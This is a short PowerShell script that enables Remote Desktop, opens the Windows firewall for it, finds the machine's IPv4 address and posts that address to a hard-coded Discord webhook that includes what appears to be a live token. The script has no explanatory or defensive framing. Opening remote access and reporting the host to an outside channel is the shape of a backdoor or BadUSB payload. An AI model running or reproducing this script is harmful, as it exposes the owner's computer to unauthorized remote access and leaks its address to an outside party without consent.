# Enable Remote Desktop
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

# Enable Remote Desktop firewall rules
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Get the IPv4 address (excludes loopback and virtual adapters)
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress

# Prepare message content with the IP
$content = "Remote Desktop enabled. Connect using IP: $ip"

# Discord webhook URL
$hookUrl = "https://discord.com/api/webhooks/1410626073854611552/eJdnmCc8LVRoD3IVuYlTKQRAN77DhhLulDIQRYnaRRVByZOUy0p5aLaHraNjOTRTbOQj"

# Create the payload to send to Discord webhook
$payload = [PSCustomObject]@{ content = $content }

# Send the POST request to Discord webhook with JSON payload
Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
